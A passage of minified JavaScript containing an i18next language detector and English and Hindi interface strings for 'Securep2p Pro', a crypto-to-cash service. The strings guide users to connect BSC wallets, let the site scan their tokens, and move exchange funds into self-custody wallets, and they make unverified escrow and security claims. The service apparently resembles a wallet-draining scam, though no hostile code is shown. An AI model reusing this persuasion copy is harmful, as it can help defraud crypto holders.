            }
        }
        return r
    }
};
let hn = null;
const Vc = () => {
    if (hn !== null)
        return hn;
    try {
        if (hn = typeof window < "u" && window.localStorage !== null,
        !hn)
            return !1;
        const e = "i18next.translate.boo";
        window.localStorage.setItem(e, "foo"),
        window.localStorage.removeItem(e)
    } catch {
        hn = !1
    }
    return hn
}
;
var bx = {
    name: "localStorage",
    lookup(e) {
        let {lookupLocalStorage: t} = e;
        if (t && Vc())
            return window.localStorage.getItem(t) || void 0
    },
    cacheUserLanguage(e, t) {
        let {lookupLocalStorage: n} = t;
        n && Vc() && window.localStorage.setItem(n, e)
    }
};
let pn = null;
const Hc = () => {
    if (pn !== null)
        return pn;
    try {
        if (pn = typeof window < "u" && window.sessionStorage !== null,
        !pn)
            return !1;
        const e = "i18next.translate.boo";
        window.sessionStorage.setItem(e, "foo"),
        window.sessionStorage.removeItem(e)
    } catch {
        pn = !1
    }
    return pn
}
;
var Nx = {
    name: "sessionStorage",
    lookup(e) {
        let {lookupSessionStorage: t} = e;
        if (t && Hc())
            return window.sessionStorage.getItem(t) || void 0
    },
    cacheUserLanguage(e, t) {
        let {lookupSessionStorage: n} = t;
        n && Hc() && window.sessionStorage.setItem(n, e)
    }
}
  , kx = {
    name: "navigator",
    lookup(e) {
        const t = [];
        if (typeof navigator < "u") {
            const {languages: n, userLanguage: r, language: s} = navigator;
            if (n)
                for (let i = 0; i < n.length; i++)
                    t.push(n[i]);
            r && t.push(r),
            s && t.push(s)
        }
        return t.length > 0 ? t : void 0
    }
}
  , jx = {
    name: "htmlTag",
    lookup(e) {
        let {htmlTag: t} = e, n;
        const r = t || (typeof document < "u" ? document.documentElement : null);
        return r && typeof r.getAttribute == "function" && (n = r.getAttribute("lang")),
        n
    }
}
  , Bx = {
    name: "path",
    lookup(e) {
        var s;
        let {lookupFromPathIndex: t} = e;
        if (typeof window > "u")
            return;
        const n = window.location.pathname.match(/\/([a-zA-Z-]*)/g);
        return Array.isArray(n) ? (s = n[typeof t == "number" ? t : 0]) == null ? void 0 : s.replace("/", "") : void 0
    }
}
  , Tx = {
    name: "subdomain",
    lookup(e) {
        var s, i;
        let {lookupFromSubdomainIndex: t} = e;
        const n = typeof t == "number" ? t + 1 : 1
          , r = typeof window < "u" && ((i = (s = window.location) == null ? void 0 : s.hostname) == null ? void 0 : i.match(/^(\w{2,5})\.(([a-z0-9-]{1,63}\.[a-z]{2,6})|localhost)/i));
        if (r)
            return r[n]
    }
};
let vm = !1;
try {
    document.cookie,
    vm = !0
} catch {}
const Sm = ["querystring", "cookie", "localStorage", "sessionStorage", "navigator", "htmlTag"];
vm || Sm.splice(1, 1);
const Cx = () => ({
    order: Sm,
    lookupQuerystring: "lng",
    lookupCookie: "i18next",
    lookupLocalStorage: "i18nextLng",
    lookupSessionStorage: "i18nextLng",
    caches: ["localStorage"],
    excludeCacheFor: ["cimode"],
    convertDetectedLanguage: e => e
});
class wm {
    constructor(t) {
        let n = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
        this.type = "languageDetector",
        this.detectors = {},
        this.init(t, n)
    }
    init() {
        let t = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {
            languageUtils: {}
        }
          , n = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {}
          , r = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : {};
        this.services = t,
        this.options = xx(n, this.options || {}, Cx()),
        typeof this.options.convertDetectedLanguage == "string" && this.options.convertDetectedLanguage.indexOf("15897") > -1 && (this.options.convertDetectedLanguage = s => s.replace("-", "_")),
        this.options.lookupFromUrlIndex && (this.options.lookupFromPathIndex = this.options.lookupFromUrlIndex),
        this.i18nOptions = r,
        this.addDetector(vx),
        this.addDetector(Sx),
        this.addDetector(bx),
        this.addDetector(Nx),
        this.addDetector(kx),
        this.addDetector(jx),
        this.addDetector(Bx),
        this.addDetector(Tx),
        this.addDetector(wx)
    }
    addDetector(t) {
        return this.detectors[t.name] = t,
        this
    }
    detect() {
        let t = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : this.options.order
          , n = [];
        return t.forEach(r => {
            if (this.detectors[r]) {
                let s = this.detectors[r].lookup(this.options);
                s && typeof s == "string" && (s = [s]),
                s && (n = n.concat(s))
            }
        }
        ),
        n = n.filter(r => r != null && !gx(r)).map(r => this.options.convertDetectedLanguage(r)),
        this.services && this.services.languageUtils && this.services.languageUtils.getBestMatchFromCodes ? n : n.length > 0 ? n[0] : null
    }
    cacheUserLanguage(t) {
        let n = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : this.options.caches;
        n && (this.options.excludeCacheFor && this.options.excludeCacheFor.indexOf(t) > -1 || n.forEach(r => {
            this.detectors[r] && this.detectors[r].cacheUserLanguage(t, this.options)
        }
        ))
    }
}
wm.type = "languageDetector";
const Px = {
    en: {
        translation: {
            "header.title": "Securep2p Pro",
            "header.liveRates": "Live Rates",
            "header.connected": "Operator Online",
            "header.livePayout": "LIVE PAYOUT",
            "header.successful": "Successful",
            "header.trading": "Trading",
            "header.pricing": "Pricing",
            "header.settlement": "Settlement",
            "trust.totalVolume": "Total Volume",
            "trust.activeUsers": "Active Users",
            "trust.successRate": "Success Rate",
            "trust.avgSettlement": "Avg Settlement",
            "asset.title": "Asset Management",
            "asset.subtitle": "Convert your crypto assets to cash instantly",
            "asset.connectWallet": "Connect Your Wallet",
            "asset.connectSubtitle": "Secure connection to BSC network",
            "asset.connectButton": "Connect Wallet",
            "asset.connecting": "Connecting...",
            "asset.tradeAssets": "Trade Your Assets",
            "asset.tradeSubtitle": "Select assets to convert to cash",
            "asset.scanningAssets": "Scanning Your Assets",
            "asset.analyzing": "Analyzing your wallet for available tokens...",
            "asset.selectAsset": "Select Asset to Trade",
            "asset.chooseAsset": "Choose an asset from your wallet",
            "asset.amountToTrade": "Amount to Trade",
            "asset.maxBalance": "Max Balance",
            "asset.amountExceeds": "Amount exceeds available balance",
            "asset.liveCalculation": "Live Price Calculation",
            "asset.marketRate": "Based on current market rates",
            "asset.enterAmount": "Enter amount to see live calculation",
            "asset.fetchingPrice": "Fetching live price...",
            "asset.youReceive": "You Receive",
            "asset.usdEquivalent": "USD Equivalent",
            "asset.priceBreakdown": "Price Breakdown",
            "asset.marketPrice": "Market Price",
            "asset.exchangeMarkup": "Exchange Markup (15%)",
            "asset.totalReceive": "Total You Receive",
            "asset.nextPayout": "Next: Choose Payout Method",
            "asset.noAssets": "No Assets Found",
            "asset.noAssetsDesc": "No tradeable assets found in your wallet",
            "asset.tip": "Tip: Make sure you have tokens in your BSC wallet",
            "exchange.transferGuide": "Transfer from Binance/KuCoin to MetaMask/TrustWallet",
            "exchange.howToTransfer": "How to Transfer from Exchange to Wallet",
            "exchange.step1Title": "1. Convert Your Token to USDT",
            "exchange.step1Subtitle": "(Works on all exchanges – Binance, KuCoin, OKX, Bitget, Kraken, etc.)",
            "exchange.step1Desc": "Log in to your exchange account and convert your tokens to USDT for easier withdrawal.",
            "exchange.step1Details": 'Go to "Trade" or "Convert" section → Select your token (BTC, ETH, etc.) → Choose to swap/sell to USDT → Confirm the trade',
            "exchange.step2Title": "2. Prepare for Withdrawal – Cover BEP20 Fees",
            "exchange.step2Desc": "BEP20 withdrawals require BNB for gas fees. Buy ~$1 worth of BNB (0.002 BNB is usually enough).",
            "exchange.step2Details": 'Go to "Trade"/"Convert" → Buy BNB with USDT → Keep small amount for transaction fees',
            "exchange.step3Title": "3. Withdraw USDT (BEP20) to Trust Wallet/MetaMask",
            "exchange.step3Desc": 'Go to "Wallet" or "Assets" → Find USDT → Click "Withdraw" → Choose BEP20 network',
            "exchange.step3Details": "Open your wallet → Copy BEP20 address (starts with 0x...) → Paste into exchange → Complete 2FA/Security checks",
            "exchange.step4Title": "4. Withdraw BNB (for Gas Fees)",
            "exchange.step4Desc": "Repeat withdrawal process with BNB to the same address. You only need 0.002 BNB.",
            "exchange.step5Title": "5. Wait for Confirmation",
            "exchange.step5Desc": "BEP20 withdrawals process within 2-10 minutes. Check your wallet for USDT and BNB balances.",
            "exchange.step6Title": "6. Important: Always Keep BNB for Transactions",
            "exchange.step6Desc": "You MUST have BNB in your wallet for future transactions. Never try to move BEP20 tokens with 0 BNB.",
            "exchange.binanceExample": "Sample Flow – Binance to MetaMask (BEP20 USDT)",
            "exchange.binanceStep1": "Sell your other token for USDT",
            "exchange.binanceStep2": "Buy $1 worth of BNB",
            "exchange.binanceStep3": "Withdraw USDT (BEP20) to MetaMask BSC address",
            "exchange.binanceStep4": "Withdraw BNB (BEP20) to same address",
            "exchange.binanceStep5": "Wait for both to arrive",
            "exchange.proTips": "Pro Tips",
            "exchange.tip1": 'Always double-check the network: For BEP20, use "Binance Smart Chain" (not ERC20, not TRC20)',
            "exchange.tip2": "Test with small amount first ($5) to confirm withdrawal process",
            "exchange.tip3": "Never send to wrong network—assets may be lost permanently",
            "exchange.tip4": "Check withdrawal history and BSCscan.com for real-time status",
            "exchange.tip5": "Keep some BNB for gas fees—transactions fail without it",
            "exchange.networkWarning": "⚠️ Network Selection Critical",
            "exchange.networkDetails": `Choose "BEP20 (BSC)" / "Binance Smart Chain (BEP20)" as withdrawal network. Don't select ERC20 or TRC20.`,
            "exchange.fromBinance": "From Binance Exchange",
            "exchange.fromKucoin": "From KuCoin Exchange",
            "exchange.settingUpWallet": "Setting Up Your Wallet",
            "exchange.metamaskSetup": "MetaMask Setup",
            "exchange.trustwalletSetup": "TrustWallet Setup",
            "exchange.importantTips": "Important Tips",
            "exchange.step1": "Login & Navigate to Wallet",
            "exchange.step1Desc": `• Login to your Binance account
• Go to "Wallet" → "Fiat and Spot"
• Find your crypto (BTC, ETH, USDT, etc.)`,
            "exchange.step2": "Initiate Withdrawal",
            "exchange.step2Desc": `• Click "Withdraw" next to your crypto
• Select "Send via Crypto Network"
• Choose "BSC (BEP20)" network for lower fees`,
            "exchange.step3": "Enter Wallet Address",
            "exchange.step3Desc": `• Copy your MetaMask/TrustWallet BSC address
• Paste it in the "Recipient's Address" field
• Double-check the address is correct`,
            "exchange.step4": "Complete Transfer",
            "exchange.step4Desc": `• Enter amount to withdraw
• Review network fee (usually $1-3 on BSC)
• Click "Withdraw" and confirm via email/SMS`,
            "exchange.convertTitle": "Convert Your Token to USDT",
            "exchange.convertSubtitle": "(Works on all exchanges – Binance, KuCoin, OKX, Bitget, Kraken, etc.)",
            "exchange.convertStep1": "Log in to your exchange account (Binance, KuCoin, etc.)",
            "exchange.convertStep2": 'Go to "Trade" or "Convert" section',
            "exchange.convertStep3": "Select the token you hold (e.g., BTC, ETH)",
            "exchange.convertStep4": "Choose to swap/sell to USDT (Tether)",
            "exchange.convertBinance": 'On Binance: "Convert" > select token > USDT > Convert',
            "exchange.convertKucoin": 'On KuCoin: "Trade" > Spot > select pair (e.g., BTC/USDT) > Sell for USDT',
            "exchange.convertOthers": "On OKX/Bitget/Kraken: Use Spot/Convert/Trade as per UI",
            "exchange.convertConfirm": "Confirm the trade. Now your balance is in USDT",
            "exchange.prepareTitle": "Prepare for Withdrawal – Cover BEP20 Fees",
            "exchange.prepareDesc": "BEP20 (Binance Smart Chain) withdrawals require a small amount of BNB in your wallet to pay gas fees.",
            "exchange.prepareNote": "Some exchanges deduct BNB automatically from your withdrawal, but many send only USDT—you'll need to manually send a little BNB for future transactions.",
            "exchange.prepareBuy": "Buy ~$1 worth of BNB (0.002 BNB is usually enough for many transfers)",
            "exchange.prepareHow": 'Same as above: Go to "Trade"/"Convert", buy BNB with USDT',
            "exchange.withdrawTitle": "Withdraw USDT (BEP20) to Trust Wallet/MetaMask",
            "exchange.withdrawStep1": 'Go to "Wallet" or "Assets" on your exchange',
            "exchange.withdrawStep2": 'Find USDT, click "Withdraw" or "Send"',
            "exchange.networkTitle": "Network Selection:",
            "exchange.networkSelect": 'Choose "BEP20 (BSC)" / "Binance Smart Chain (BEP20)" as the withdrawal network',
            "exchange.networkWarning": "⚠️ Don't select ERC20 or TRC20 if you want to use BSC/BEP20",
            "exchange.addressTitle": "Enter Your Wallet Address:",
            "exchange.addressStep1": "Open Trust Wallet or MetaMask",
            "exchange.addressStep2": 'Select "Smart Chain" (for BSC) or add BSC to MetaMask if not already',
            "exchange.addressStep3": "Copy your BEP20 address (it will start with 0x...)",
            "exchange.addressStep4": "Paste the address into the exchange withdrawal form",
            "exchange.addressStep5": "Enter the withdrawal amount (leave a small amount for withdrawal fees, shown on the exchange)",
            "exchange.addressStep6": "Complete any 2FA/Security checks",
            "exchange.addressStep7": "Confirm the withdrawal",
            "exchange.bnbTitle": "Withdraw BNB (for Gas Fees)",
            "exchange.bnbDesc": "Repeat the withdrawal process with BNB:",
            "exchange.bnbStep1": "Withdraw BNB to the same address (your MetaMask/Trust Wallet)",
            "exchange.bnbStep2": "You only need a small amount (e.g., 0.002 BNB)",
            "exchange.waitTitle": "Wait for Confirmation",
            "exchange.waitDesc": "Most BEP20 withdrawals are processed within 2-10 minutes",
            "exchange.waitCheck": 'Check your Trust Wallet/MetaMask for USDT and BNB balances under the "Smart Chain"/BSC network',
            "exchange.emergencyTitle": "(If You Only Have USDT and No BNB in Your Wallet)",
            "exchange.emergencyDesc": "You MUST have some BNB in your wallet to pay for future transactions (sending, swapping, etc)",
            "exchange.emergencyOptions": "If you forgot, you can:",
            "exchange.emergencyOption1": "Buy BNB on the exchange and send to your wallet",
            "exchange.emergencyOption2": "Ask a friend to send you a small amount of BNB",
            "exchange.emergencyWarning": "Never try to move/swap BEP20 tokens with 0 BNB in your wallet – transaction will fail",
            "exchange.sampleTitle": "Sample Flow – Binance to MetaMask (BEP20 USDT)",
            "exchange.sampleStep1": "Sell your other token for USDT",
            "exchange.sampleStep2": "Buy $1 worth of BNB",
            "exchange.sampleStep3": "Withdraw USDT (BEP20) to your MetaMask BSC address",
            "exchange.sampleStep4": "Withdraw BNB (BEP20) to the same address",
            "exchange.sampleStep5": "Wait for both to arrive",
            "exchange.proTipsTitle": "Pro Tips",
            "exchange.proTip1": 'Always double-check the network: For BEP20, network is "Binance Smart Chain" (not ERC20, not TRC20)',
            "exchange.proTip2": "Test with a small amount first (e.g., $5) to confirm the withdrawal process",
            "exchange.proTip3": "Never send funds to the wrong network—assets may be lost if you send to unsupported network addresses",
            "exchange.proTip4": "If you get stuck, check your exchange withdrawal history and your wallet's BSCscan.com entry (search by address) for real-time status",
            "exchange.kucoin1": "Access Assets",
            "exchange.kucoin1Desc": `• Login to KuCoin account
• Go to "Assets" → "Main Account"
• Locate your cryptocurrency`,
            "exchange.kucoin2": "Start Withdrawal",
            "exchange.kucoin2Desc": `• Click "Withdraw" button
• Select "On-chain Withdraw"
• Choose "BSC" network for best rates`,
            "exchange.kucoin3": "Add Wallet Address",
            "exchange.kucoin3Desc": `• Get your wallet's BSC address
• Paste in "Withdrawal Address" field
• Add address to whitelist if required`,
            "exchange.kucoin4": "Confirm Withdrawal",
            "exchange.kucoin4Desc": `• Enter withdrawal amount
• Review fees and final amount
• Confirm with 2FA/email verification`,
            "exchange.metamaskDesc": `• Install MetaMask browser extension
• Create new wallet or import existing
• Add BSC network manually:
Network: BSC Mainnet
RPC: https://bsc-dataseed.binance.org/
Chain ID: 56
Symbol: BNB`,
            "exchange.trustwalletDesc": `• Download TrustWallet mobile app
• Create new wallet or import
• BSC network is pre-configured
• Enable Smart Chain (BNB) in settings
• Your BSC address starts with "0x..."`,
            "exchange.tip1": "• Always use BSC (BEP20) network for lowest fees ($1-3 vs $20-50 on Ethereum)",
            "exchange.tip2": "• Double-check wallet addresses - crypto transfers are irreversible",
            "exchange.tip3": "• Start with small amounts to test the process first",
            "exchange.tip4": "• Keep some BNB in your wallet for transaction fees",
            "exchange.tip5": "• Transfers usually take 1-5 minutes on BSC network",
            "howWorks.title": "How It Works",
            "howWorks.choosePayment": "Choose Payment Method",
            "howWorks.choosePaymentDesc": "Select your preferred payout method and region",
            "howWorks.placeOrder": "Place Your Order",
            "howWorks.placeOrderDesc": "Specify the amount and confirm transaction details",
            "howWorks.processPayment": "Process Payment",
            "howWorks.processPaymentDesc": "Our system processes your crypto assets securely",
            "howWorks.settlement": "Instant Settlement",
            "howWorks.settlementDesc": "Receive funds in your chosen payment method within minutes",
            "howWorks.complete": "Transaction Complete",
            "howWorks.completeDesc": "Your crypto has been successfully converted to cash",
            "howWorks.source": "Payment Source",
            "howWorks.sourceDesc": "We setlle your order through Escrow Release & Settlement Accounts & Corporate Bank Account",
            "howWorks.note": "Note: All Transactions are covered by escrow & real-time monitoring.",
            "howWorks.support": "24/7 customer support available for assistance",
            "payment.selected": "Selected",
            "common.loading": "Loading...",
            "common.error": "Error",
            "common.success": "Success",
            "common.continue": "Continue",
            "common.back": "Back",
            "common.next": "Next",
            "common.confirm": "Confirm",
            "common.cancel": "Cancel"
        },
        detailedGuide: {
            step1Title: "1. Convert Your Token to USDT",
            step1Subtitle: "(Works on all exchanges – Binance, KuCoin, OKX, Bitget, Kraken, etc.)",
            step1Content: 'Log in to your exchange account (Binance, KuCoin, etc.). Go to "Trade" or "Convert" section. Select the token you hold (e.g., BTC, ETH). Choose to swap/sell to USDT (Tether). Confirm the trade. Now your balance is in USDT.',
            step1Binance: 'On Binance: "Convert" > select token > USDT > Convert.',
            step1Kucoin: 'On KuCoin: "Trade" > Spot > select pair (e.g., BTC/USDT) > Sell for USDT.',
            step1Others: "On OKX/Bitget/Kraken: Use Spot/Convert/Trade as per UI.",
            step2Title: "2. Prepare for Withdrawal – Cover BEP20 Fees",
            step2Content: "BEP20 (Binance Smart Chain) withdrawals require a small amount of BNB in your wallet to pay gas fees. Some exchanges deduct BNB automatically from your withdrawal, but many send only USDT—you'll need to manually send a little BNB for future transactions.",
            step2Action: 'What to do: Buy ~$1 worth of BNB (0.002 BNB is usually enough for many transfers). Same as above: Go to "Trade"/"Convert", buy BNB with USDT.',
            step3Title: "3. Withdraw USDT (BEP20) to Trust Wallet/MetaMask",
            step3Content: 'Go to "Wallet" or "Assets" on your exchange. Find USDT, click "Withdraw" or "Send".',
            step3Network: 'Network Selection: Choose "BEP20 (BSC)" / "Binance Smart Chain (BEP20)" as the withdrawal network.',
            step3Warning: "⚠️ Don't select ERC20 or TRC20 if you want to use BSC/BEP20.",
            step3Address: 'Enter Your Wallet Address: Open Trust Wallet or MetaMask. Select "Smart Chain" (for BSC) or add BSC to MetaMask if not already. Copy your BEP20 address (it will start with 0x...). Paste the address into the exchange withdrawal form. Enter the withdrawal amount (leave a small amount for withdrawal fees, shown on the exchange). Complete any 2FA/Security checks. Confirm the withdrawal.',
            step4Title: "4. Withdraw BNB (for Gas Fees)",
            step4Content: "Repeat the withdrawal process with BNB: Withdraw BNB to the same address (your MetaMask/Trust Wallet). You only need a small amount (e.g., 0.002 BNB).",
            step5Title: "5. Wait for Confirmation",
            step5Content: 'Most BEP20 withdrawals are processed within 2-10 minutes. Check your Trust Wallet/MetaMask for USDT and BNB balances under the "Smart Chain"/BSC network.',
            step6Title: "6. (If You Only Have USDT and No BNB in Your Wallet)",
            step6Content: "You MUST have some BNB in your wallet to pay for future transactions (sending, swapping, etc). If you forgot, you can: Buy BNB on the exchange and send to your wallet. Ask a friend to send you a small amount of BNB. Never try to move/swap BEP20 tokens with 0 BNB in your wallet – transaction will fail.",
            sampleFlowTitle: "Sample Flow – Binance to MetaMask (BEP20 USDT)",
            sampleStep1: "Sell your other token for USDT.",
            sampleStep2: "Buy $1 worth of BNB.",
            sampleStep3: "Withdraw USDT (BEP20) to your MetaMask BSC address.",
            sampleStep4: "Withdraw BNB (BEP20) to the same address.",
            sampleStep5: "Wait for both to arrive.",
            proTipsTitle: "Pro Tips",
            proTip1: 'Always double-check the network: For BEP20, network is "Binance Smart Chain" (not ERC20, not TRC20).',
            proTip2: "Test with a small amount first (e.g., $5) to confirm the withdrawal process.",
            proTip3: "Never send funds to the wrong network—assets may be lost if you send to unsupported network addresses.",
            proTip4: "If you get stuck, check your exchange withdrawal history and your wallet's BSCscan.com entry (search by address) for real-time status."
        }
    },
    hi: {
        translation: {
            "header.title": "सिक्योरस्वैप प्रो",
            "header.liveRates": "लाइव रेट्स",
            "header.connected": "कनेक्टेड",
            "header.livePayout": "लाइव पेआउट",
            "header.successful": "सफल",
            "header.trading": "ट्रेडिंग",
            "header.pricing": "प्राइसिंग",
            "header.settlement": "सेटलमेंट",
            "trust.totalVolume": "कुल वॉल्यूम",
            "trust.activeUsers": "सक्रिय उपयोगकर्ता",
            "trust.successRate": "सफलता दर",
            "trust.avgSettlement": "औसत सेटलमेंट",
            "asset.title": "एसेट मैनेजमेंट",
            "asset.subtitle": "अपनी क्रिप्टो संपत्ति को तुरंत नकद में बदलें",
            "asset.connectWallet": "अपना वॉलेट कनेक्ट करें",
            "asset.connectSubtitle": "BSC नेटवर्क से सुरक्षित कनेक्शन",
            "asset.connectButton": "वॉलेट कनेक्ट करें",
            "asset.connecting": "कनेक्ट हो रहा है...",
            "asset.tradeAssets": "अपनी संपत्ति का व्यापार करें",
            "asset.tradeSubtitle": "नकद में बदलने के लिए संपत्ति चुनें",
            "asset.scanningAssets": "आपकी संपत्ति स्कैन कर रहे हैं",
            "asset.analyzing": "उपलब्ध टोकन के लिए आपके वॉलेट का विश्लेषण कर रहे हैं...",
            "asset.selectAsset": "व्यापार के लिए संपत्ति चुनें",
            "asset.chooseAsset": "अपने वॉलेट से एक संपत्ति चुनें",
            "asset.amountToTrade": "व्यापार की राशि",
            "asset.maxBalance": "अधिकतम बैलेंस",
            "asset.amountExceeds": "राशि उपलब्ध बैलेंस से अधिक है",
            "asset.liveCalculation": "लाइव मूल्य गणना",
            "asset.marketRate": "वर्तमान बाजार दरों के आधार पर",
            "asset.enterAmount": "लाइव गणना देखने के लिए राशि दर्ज करें",
            "asset.fetchingPrice": "लाइव मूल्य प्राप्त कर रहे हैं...",
            "asset.youReceive": "आपको मिलेगा",
            "asset.usdEquivalent": "USD समकक्ष",
            "asset.priceBreakdown": "मूल्य विवरण",
            "asset.marketPrice": "बाजार मूल्य",
            "asset.exchangeMarkup": "एक्सचेंज मार्कअप (15%)",
            "asset.totalReceive": "कुल आपको मिलेगा",
            "asset.nextPayout": "अगला: पेआउट विधि चुनें",
            "asset.noAssets": "कोई संपत्ति नहीं मिली",
            "asset.noAssetsDesc": "आपके वॉलेट में कोई व्यापार योग्य संपत्ति नहीं मिली",
            "asset.tip": "सुझाव: सुनिश्चित करें कि आपके BSC वॉलेट में टोकन हैं",
            "exchange.transferGuide": "Binance/KuCoin से MetaMask/TrustWallet में ट्रांसफर",
            "exchange.howToTransfer": "एक्सचेंज से वॉलेट में ट्रांसफर कैसे करें",
            "exchange.fromBinance": "Binance एक्सचेंज से",
            "exchange.fromKucoin": "KuCoin एक्सचेंज से",
            "exchange.settingUpWallet": "अपना वॉलेट सेट करना",
            "exchange.metamaskSetup": "MetaMask सेटअप",
            "exchange.trustwalletSetup": "TrustWallet सेटअप",
            "exchange.importantTips": "महत्वपूर्ण सुझाव",
            "exchange.step1": "लॉगिन करें और वॉलेट पर जाएं",
            "exchange.step1Desc": `• अपने Binance खाते में लॉगिन करें
• "Wallet" → "Fiat and Spot" पर जाएं
• अपना क्रिप्टो खोजें (BTC, ETH, USDT, आदि)`,
            "exchange.step2": "निकासी शुरू करें",
            "exchange.step2Desc": `• अपने क्रिप्टो के बगल में "Withdraw" पर क्लिक करें
• "Send via Crypto Network" चुनें
• कम फीस के लिए "BSC (BEP20)" नेटवर्क चुनें`,
            "exchange.step3": "वॉलेट पता दर्ज करें",
            "exchange.step3Desc": `• अपना MetaMask/TrustWallet BSC पता कॉपी करें
• इसे "Recipient's Address" फील्ड में पेस्ट करें
• पता सही है यह दोबारा जांचें`,
            "exchange.step4": "ट्रांसफर पूरा करें",
            "exchange.step4Desc": `• निकासी राशि दर्ज करें
• नेटवर्क फीस की समीक्षा करें (आमतौर पर BSC पर $1-3)
• "Withdraw" पर क्लिक करें और ईमेल/SMS के माध्यम से पुष्टि करें`,
            "exchange.kucoin1": "एसेट्स एक्सेस करें",
            "exchange.kucoin1Desc": `• KuCoin खाते में लॉगिन करें
• "Assets" → "Main Account" पर जाएं
• अपनी क्रिप्टोकरेंसी का पता लगाएं`,
            "exchange.kucoin2": "निकासी शुरू करें",
            "exchange.kucoin2Desc": `• "Withdraw" बटन पर क्लिक करें
• "On-chain Withdraw" चुनें
• बेहतर दरों के लिए "BSC" नेटवर्क चुनें`,
            "exchange.kucoin3": "वॉलेट पता जोड़ें",
            "exchange.kucoin3Desc": `• अपने वॉलेट का BSC पता प्राप्त करें
• "Withdrawal Address" फील्ड में पेस्ट करें
• यदि आवश्यक हो तो पते को व्हाइटलिस्ट में जोड़ें`,
            "exchange.kucoin4": "निकासी की पुष्टि करें",
            "exchange.kucoin4Desc": `• निकासी राशि दर्ज करें
• फीस और अंतिम राशि की समीक्षा करें
• 2FA/ईमेल सत्यापन के साथ पुष्टि करें`,
            "exchange.metamaskDesc": `• MetaMask ब्राउज़र एक्सटेंशन इंस्टॉल करें
• नया वॉलेट बनाएं या मौजूदा इंपोर्ट करें
• BSC नेटवर्क मैन्युअल रूप से जोड़ें:
नेटवर्क: BSC Mainnet
RPC: https://bsc-dataseed.binance.org/
Chain ID: 56
Symbol: BNB`,
            "exchange.trustwalletDesc": `• TrustWallet मोबाइल ऐप डाउनलोड करें
• नया वॉलेट बनाएं या इंपोर्ट करें
• BSC नेटवर्क पूर्व-कॉन्फ़िगर है
• सेटिंग्स में Smart Chain (BNB) सक्षम करें
• आपका BSC पता "0x..." से शुरू होता है`,
            "exchange.tip1": "• सबसे कम फीस के लिए हमेशा BSC (BEP20) नेटवर्क का उपयोग करें ($1-3 बनाम Ethereum पर $20-50)",
            "exchange.tip2": "• वॉलेट पतों को दोबारा जांचें - क्रिप्टो ट्रांसफर अपरिवर्तनीय हैं",
            "exchange.tip3": "• पहले प्रक्रिया का परीक्षण करने के लिए छोटी मात्रा से शुरू करें",
            "exchange.tip4": "• लेनदेन फीस के लिए अपने वॉलेट में कुछ BNB रखें",
            "exchange.tip5": "• ट्रांसफर आमतौर पर BSC नेटवर्क पर 1-5 मिनट लेते हैं",
            "howWorks.title": "यह कैसे काम करता है",
            "howWorks.choosePayment": "भुगतान विधि चुनें",
            "howWorks.choosePaymentDesc": "अपनी पसंदीदा पेआउट विधि और क्षेत्र चुनें",
            "howWorks.placeOrder": "अपना ऑर्डर दें",
            "howWorks.placeOrderDesc": "राशि निर्दिष्ट करें और लेनदेन विवरण की पुष्टि करें",
            "howWorks.processPayment": "भुगतान प्रक्रिया",
            "howWorks.processPaymentDesc": "हमारा सिस्टम आपकी क्रिप्टो संपत्ति को सुरक्षित रूप से प्रोसेस करता है",
            "howWorks.settlement": "तत्काल निपटान",
            "howWorks.settlementDesc": "मिनटों में अपनी चुनी गई भुगतान विधि में धन प्राप्त करें",
            "howWorks.complete": "लेनदेन पूर्ण",
            "howWorks.completeDesc": "आपकी क्रिप्टो सफलतापूर्वक नकद में बदल दी गई है",
            "howWorks.note": "नोट: सभी लेनदेन मल्टी-सिग्नेचर तकनीक से सुरक्षित हैं",
            "howWorks.support": "सहायता के लिए 24/7 ग्राहक सहायता उपलब्ध",
            "payment.selected": "चयनित",
            "common.loading": "लोड हो रहा है...",
            "common.error": "त्रुटि",
            "common.success": "सफलता",
            "common.continue": "जारी रखें",
            "common.back": "वापस",
            "common.next": "अगला",
            "common.confirm": "पुष्टि करें",
            "common.cancel": "रद्द करें"
        },
        detailedGuide: {
            step1Title: "1. अपने टोकन को USDT में बदलें",
            step1Subtitle: "(सभी एक्सचेंजों पर काम करता है – Binance, KuCoin, OKX, Bitget, Kraken, आदि)",
            step1Content: 'अपने एक्सचेंज खाते में लॉग इन करें (Binance, KuCoin, आदि)। "Trade" या "Convert" सेक्शन में जाएं। अपने पास का टोकन चुनें (जैसे BTC, ETH)। USDT (Tether) में स्वैप/बेचने का विकल्प चुनें। ट्रेड की पुष्टि करें। अब आपका बैलेंस USDT में है।',
            step1Binance: 'Binance पर: "Convert" > टोकन चुनें > USDT > Convert।',
            step1Kucoin: 'KuCoin पर: "Trade" > Spot > जोड़ी चुनें (जैसे BTC/USDT) > USDT के लिए बेचें।',
            step1Others: "OKX/Bitget/Kraken पर: UI के अनुसार Spot/Convert/Trade का उपयोग करें।",
            step2Title: "2. निकासी की तैयारी करें – BEP20 फीस कवर करें",
            step2Content: "BEP20 (Binance Smart Chain) निकासी के लिए गैस फीस का भुगतान करने के लिए आपके वॉलेट में थोड़ी मात्रा में BNB की आवश्यकता होती है। कुछ एक्सचेंज आपकी निकासी से स्वचालित रूप से BNB काट लेते हैं, लेकिन कई केवल USDT भेजते हैं—आपको भविष्य के लेनदेन के लिए मैन्युअल रूप से थोड़ा BNB भेजना होगा।",
            step2Action: 'क्या करें: ~$1 मूल्य का BNB खरीदें (0.002 BNB आमतौर पर कई ट्रांसफर के लिए पर्याप्त है)। ऊपर के समान: "Trade"/"Convert" में जाएं, USDT के साथ BNB खरीदें।',
            step3Title: "3. Trust Wallet/MetaMask में USDT (BEP20) निकालें",
            step3Content: 'अपने एक्सचेंज पर "Wallet" या "Assets" में जाएं। USDT खोजें, "Withdraw" या "Send" पर क्लिक करें।',
            step3Network: 'नेटवर्क चयन: निकासी नेटवर्क के रूप में "BEP20 (BSC)" / "Binance Smart Chain (BEP20)" चुनें।',
            step3Warning: "⚠️ यदि आप BSC/BEP20 का उपयोग करना चाहते हैं तो ERC20 या TRC20 का चयन न करें।",
